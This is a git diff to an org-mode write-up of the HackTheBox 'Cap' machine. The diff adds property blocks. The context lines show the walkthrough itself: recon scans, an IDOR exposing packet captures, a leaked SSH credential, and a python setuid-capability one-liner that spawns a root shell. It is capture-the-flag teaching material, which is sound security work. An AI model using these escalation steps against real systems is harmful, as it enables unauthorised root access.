@@ -4,14 +4,25 @@
 #+summary: Easy linux box with some pcap analysis, and abuse of python capabilities
 #+filetags: :htb:write-up:hacking:
 * Introduction
+:PROPERTIES:
+:ID:       cab46f04-170b-442d-807a-10b28b12179b
+:PUBDATE:  <2023-03-30 Thu 21:36>
+:END:
 Welcome my write-up for hackthebox machine called CAP.
 It's an easy linux box, with a webserver that can capture packets going to the machine.
 These packet captures can be downloaded, and is named in a linear order which results in an IDOR.
 I did this box together with my buddy ~Hestenettet~, during a trip to a ctf event, couldn't have done it without ya buddy ;)
 * Recon
+:PROPERTIES:
+:ID:       0d5cef9a-d967-44e1-964e-d5bbd8d47b11
+:PUBDATE:  <2023-03-30 Thu 21:36>
+:END:
 As always we need to get to know the machine, before we can exploit it.
 I'll start by running an nmap scan, which shows a webserver running that I will enumerate manually.
 ** Nmap
+:PROPERTIES:
+:ID:       f0813851-e2e7-4d80-b0f4-e0f40bf43c8e
+:END:
 Below is the result from the ~nmap~ scan.
 #+begin_example
 # Nmap 7.92 scan initiated Fri Oct  1 21:44:13 2021 as: nmap -sV -sC -O -oA nmap 10.129.231.0
@@ -148,8 +159,14 @@ As you can see, there are three services running on the box.
  3. gunicorn on port 80
 
 ** Web enum
+:PROPERTIES:
+:ID:       307ac167-7a5a-4320-86ba-2763194ac2e7
+:END:
 Let's first start by running ~gobuster~.
 *** Gobuster
+:PROPERTIES:
+:ID:       f363815c-451f-4da8-8d8e-78af4ebca8f4
+:END:
 For the dir scan, I used the ~raft-small-words.txt~ wordlists found in SecLists.
 #+begin_example
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/cap ]
@@ -178,6 +195,9 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 #+end_example
 This didn't really give that much, so let us browse around the site manually.
 *** Index
+:PROPERTIES:
+:ID:       93f8c4ef-bd47-4318-bb63-fffa06d86a89
+:END:
 The index page on this box is a dashboard, showing some statistics around security related events on the network.
 #+caption: Frontpage is a dashboard
 [[file:assets/2021-10-04_20-44-20_screenshot.png]]
@@ -188,6 +208,9 @@ On the left there is a menu linking to three other sites:
  + Network Status :: links to ~/netstat~, didn't show up on the ~gobuster~ scan, it shows the output from ~netstat~
 
 *** Ipconfig
+:PROPERTIES:
+:ID:       d9a64edb-183e-4f58-a547-e2c12cd4b991
+:END:
 There isn't anything anything really interesting, there is the possibility of an internal ip leak.
 So it's worth taking note off.
 #+begin_example
@@ -211,6 +234,9 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
 #+end_example
 
 *** Network status
+:PROPERTIES:
+:ID:       efe70ea6-757f-41ca-a2cd-6e0838080957
+:END:
 Again not really anything major here, not something you would want out there open for everyone, but there isn't anything we can exploit from it.
 #+begin_example
 Active Internet connections (servers and established)
@@ -335,6 +361,9 @@ unix  2      [ ]         DGRAM                    31835    -
 Still definetly note it down, it is still an information leak!
 And could be used when pivoting to other networks.
 *** Pcap scanning
+:PROPERTIES:
+:ID:       006ff73b-be3d-4658-ab26-1bc3e40c8fea
+:END:
 The ~/data/<capture attempt>~ endpoint, shows statistisc from a packet capture of 5 seconds.
 #+caption: Webpage for Security snapshot
 [[file:assets/2021-10-04_21-03-43_screenshot.png]]
@@ -348,7 +377,14 @@ This btw is called an IDOR, or insecure direct object reference.
 
 Looks like we might have gotten something interesting here, let's download this capture and look at it in wireshark.
 * Exploitation
+:PROPERTIES:
+:ID:       20b2818e-db84-4cbe-9744-089112957200
+:PUBDATE:  <2023-03-30 Thu 21:36>
+:END:
 ** Pcap analysis
+:PROPERTIES:
+:ID:       d99329a4-2934-4443-ba89-425113a7bb30
+:END:
 The pcap file retreived from the IDOR contains a fair amount of packets, to look closer at those open up ~wireshark~.
 #+caption: Start of ~0.pcap~
 [[file:assets/2021-10-04_21-21-35_screenshot.png]]
@@ -386,6 +422,9 @@ And we have a username and password for the machine:
 : nathan:Buck3tH4TF0RM3!
 Now that we have a user let's connect to the machine and get user flag!
 ** User flag
+:PROPERTIES:
+:ID:       34a25cf9-1772-4966-b0e4-781e506cc38c
+:END:
 Let's connect with ~ssh~:
 #+begin_example
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/cap ]
@@ -430,6 +469,10 @@ nathan@cap:~$ cat user.txt
 e2da0████████████████████████████
 #+end_example
 * Priv esc
+:PROPERTIES:
+:ID:       372ae62f-d1a1-4a49-9080-6df7b4716c5d
+:PUBDATE:  <2023-03-30 Thu 21:36>
+:END:
 Now we need to escalate our privileges inorder to get root!
 First i'll upload ~linPEAS.sh~ and execute it.
 Todo this i created a python http server in a folder with ~linpeas.sh~ in it.
@@ -483,6 +526,9 @@ nathan@cap:~$ python3.8 -xc "import os; os.setuid(0); os.system('/bin/bash')"
 root@cap:~#
 #+end_example
 ** Root flag
+:PROPERTIES:
+:ID:       1aaba34d-1ed5-4a7e-97fa-26cbc931f602
+:END:
 Now all we need to do is read the flag:
 #+begin_example
 root@cap:~# cd /root/
